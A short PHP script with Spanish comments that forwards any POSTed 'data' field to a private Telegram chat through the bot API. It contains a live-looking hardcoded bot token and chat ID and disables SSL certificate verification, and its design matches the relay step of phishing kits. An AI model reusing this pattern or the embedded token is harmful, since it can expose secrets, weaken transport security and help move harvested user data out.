<?php
// save_data.php - Enviar datos a Telegram

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $data = $_POST['data'];
    
    // Configuración de Telegram
    $bot_token = "7764849943:AAFvdWIUUHKcK19AzMMks2B6kbITdv-cZpE";  // Reemplazá con tu token de BotFather
    $chat_id = "1502580135";      // Reemplazá con tu chat ID
    
    // Preparar mensaje
    $mensaje = "📝 *Nuevos datos recibidos:*\n\n" . $data;
    
    // Enviar a Telegram
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code == 200) {
        echo "Datos enviados a Telegram correctamente";
    } else {
        http_response_code(500);
        echo "Error enviando a Telegram: " . $response;
    }
} else {
    http_response_code(400);
    echo "Solicitud inválida";
}
?>
